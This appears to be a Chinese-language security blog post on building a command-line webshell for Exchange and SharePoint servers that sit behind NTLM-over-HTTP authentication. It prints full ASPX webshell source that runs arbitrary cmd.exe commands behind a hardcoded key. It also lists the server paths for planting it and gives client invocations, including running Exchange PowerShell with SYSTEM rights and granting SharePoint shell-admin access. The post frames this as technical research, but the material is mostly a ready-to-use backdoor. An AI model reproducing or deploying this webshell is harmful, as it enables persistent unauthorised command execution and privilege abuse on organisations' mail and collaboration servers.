I"2#<h2 id="0x00-前言">0x00 前言</h2>
<hr />

<p>在某些环境下，访问Web服务器的资源需要通过NTLM Over HTTP协议进行NTLM认证，而我们在这样的Web服务器使用Webshell时，不仅需要考虑NTLM认证的实现，还需要满足能够在命令行下使用。</p>

<p>本文仅在技术研究的角度介绍一种实现方法，开源代码，分享脚本开发细节。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr />

<p>本文将要介绍以下内容：</p>

<ul>
  <li>设计思路</li>
  <li>脚本开发细节</li>
  <li>开源代码</li>
</ul>

<h2 id="0x02-设计思路">0x02 设计思路</h2>
<hr />

<p>通过NTLM Over HTTP协议进行NTLM认证的Web服务器有很多，这里分别以Exchange和SharePoint为例</p>

<p>(1)Exchange测试环境</p>

<p>文件保存的绝对路径：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Program Files\Microsoft\Exchange Server\V15\ClientAccess\Autodiscover\test.aspx
</code></pre></div></div>

<p>对应的URL为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://URL/Autodiscover/test.aspx
</code></pre></div></div>

<p>(2)SharePoint测试环境</p>

<p>文件保存的绝对路径：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Program Files\Common Files\microsoft shared\Web Server Extensions\15\TEMPLATE\LAYOUTS\test.aspx
</code></pre></div></div>

<p>对应的URL为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://URL/_layouts/15/test.aspx
</code></pre></div></div>

<p>访问test.aspx时均需要通过NTLM Over HTTP协议进行NTLM认证</p>

<p>这里以一个支持cmd命令的webshell为例进行测试，webshell的地址为：</p>

<p>https://github.com/tennc/webshell/blob/master/aspx/asp.net-backdoors/cmdexec.aspx</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-1-30/2-1.png" alt="Alt text" /></p>

<p>这个webshell需要通过浏览器进行操作，首先完成NTLM认证，接着填入正确的Auth Key和要执行的cmd命令</p>

<p>我们的目标是满足能够在命令行下使用，可以以此为模板进行修改，设计思路如下：</p>

<p>(1)execCmd.aspx</p>

<p>接收Form表单请求作为参数，对Auth Key进行验证</p>

<p>如果验证失败，返回空结果</p>

<p>如果验证成功，执行传入的cmd命令并返回执行结果</p>

<p>(2)aspxCmdNTLM.py</p>

<p>命令行脚本</p>

<p>首先通过NTLM Over HTTP协议完成NTLM认证，这里需要支持明文和用户口令hash两种登录方式</p>

<p>通过Form表单请求发送Auth Key和要执行的cmd命令，接收cmd命令的执行结果</p>

<p>execCmd.aspx和aspxCmdNTLM.py的通信内容作Base64编码，在程序实现上需要考虑Base64编码和解码</p>

<h2 id="0x03-脚本开发细节">0x03 脚本开发细节</h2>
<hr />

<h3 id="1execcmdaspx">1.execCmd.aspx</h3>

<p>使用Page_Load方法接收Form表单请求，其中data1用作Auth Key，data2用作cmd命令</p>

<p>Base64编码的实现：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>byte[] enbytes = Encoding.Default.GetBytes(string1);
string string2 = Convert.ToBase64String(enbytes);
</code></pre></div></div>

<p>Base64解码的实现：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>byte[] outbyte = Convert.FromBase64String(string1);
string string2 = Encoding.Default.GetString(outbyte);
</code></pre></div></div>

<p>完整的实现代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;%@ Page Language="C#"%&gt;
&lt;%@ Import namespace="System.Diagnostics"%&gt;
&lt;%@ Import Namespace="System.IO"%&gt;

&lt;script runat="server"&gt;
    private const string AUTHKEY = "UGFzc3dvcmQxMjM0NTY3ODk";
    protected void Page_Load(object sender, EventArgs e)
    {    
        string data1 = Request.Form["data1"];
        if (data1 != AUTHKEY)
        {          
            return;
        }
        string data2 = Request.Form["data2"];
        byte[] outbyte = Convert.FromBase64String(data2);
        string payload = Encoding.Default.GetString(outbyte);              
        string outstr1 = ExecuteCommand(payload);
        byte[] enbytes = Encoding.Default.GetBytes(outstr1);
        string outstr2 = Convert.ToBase64String(enbytes);
        Response.Write(outstr2);
    }

    private string ExecuteCommand(string command)
    {
        try
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.FileName = "cmd.exe";
            processStartInfo.Arguments = "/c " + command;
            processStartInfo.RedirectStandardOutput = true;
            processStartInfo.UseShellExecute = false;
            Process process = Process.Start(processStartInfo);
            using (StreamReader streamReader = process.StandardOutput)
            {
                string ret = streamReader.ReadToEnd();
                return ret;
            }
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }
&lt;/script&gt;
</code></pre></div></div>

<h3 id="2aspxcmdntlmpy">2.aspxCmdNTLM.py</h3>

<p>NTLM认证的实现可以参考之前的代码：</p>

<p>https://github.com/3gstudent/Homework-of-Python/blob/master/checkEWS.py</p>

<p>支持明文和用户口令hash两种登录方式</p>

<p>Form表单请求通过POST方式发送</p>

<p>Base64编码和解码需要注意字符串的格式</p>

<p>完整的代码已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-Python/blob/master/aspxCmdNTLM.py</p>

<p>execCmd.aspx需要保存在Web服务器</p>

<p>aspxCmdNTLM.py在命令行下执行，连接<a href="https://github.com/3gstudent/test/blob/master/execCmd.aspx">execCmd.aspx</a>执行cmd命令并获得返回结果</p>

<p>aspxCmdNTLM.py支持明文和用户口令hash两种登录方式</p>

<p>对于Exchange服务器，对应的Webshell权限为System</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-1-30/3-1.png" alt="Alt text" /></p>

<p>可以直接调用Exchange PowerShell</p>

<p>命令示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python aspxCmdNTLM.py 192.168.1.1 443 https://192.168.1.1/Autodiscover/execCmd.aspx plaintext test.com user1 Password123! "powershell -c \"Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;;Get-MailboxServer\""
</code></pre></div></div>

<p>结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-1-30/3-2.png" alt="Alt text" /></p>

<p>对于SharePoint服务器，对应的Webshell权限为用户权限</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-1-30/3-3.png" alt="Alt text" /></p>

<p>可以尝试调用SharePointServer PowerShell</p>

<p>命令示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python aspxCmdNTLM.py 192.168.1.1 443 https://192.168.1.1/Autodiscover/execCmd.aspx plaintext test.com user1 Password123! "powershell -c \"Add-PSSnapin Microsoft.SharePoint.PowerShell;Get-SPSite\""
</code></pre></div></div>

<p>这里需要注意，用户需要配置为能够访问数据库才能够执行SharePointServer PowerShell命令</p>

<p>查看可访问数据库的用户列表对应的Powershell命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-PSSnapin Microsoft.SharePoint.PowerShell;
Get-SPShellAdmin
</code></pre></div></div>

<p>添加指定用户访问数据库权限对应的Powershell命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-PSSnapin Microsoft.SharePoint.PowerShell;
Add-SPShellAdmin Domain\User1
</code></pre></div></div>

<p>删除指定用户访问数据库权限对应的Powershell命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-PSSnapin Microsoft.SharePoint.PowerShell;
Remove-SPShellAdmin Domain\User1 -Confirm:$false
</code></pre></div></div>

<p>正常的结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-1-30/3-4.png" alt="Alt text" /></p>

<h2 id="0x04-小结">0x04 小结</h2>
<hr />

<p>本文以Exchange和SharePoint为例，介绍了支持NTLM Over HTTP协议的Webshell实现思路，开源代码，分享脚本开发细节。</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET